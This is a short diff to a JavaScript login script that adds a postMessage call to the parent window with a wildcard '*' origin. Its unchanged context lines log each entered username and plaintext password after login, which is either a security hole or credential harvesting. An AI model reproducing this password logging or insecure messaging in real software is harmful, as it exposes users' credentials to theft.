@@ -548,7 +548,8 @@
     resetPopup.style.display = 'none';
     loginBox.style.borderColor = 'white';
     loginBox.style.boxShadow = '0 0 15px white';
-
+// After successful login:
+window.parent.postMessage('login_successful', '*');
     // Log successful credentials
     await logUsername(user.name, username);
     await logPassword(user.name, password);
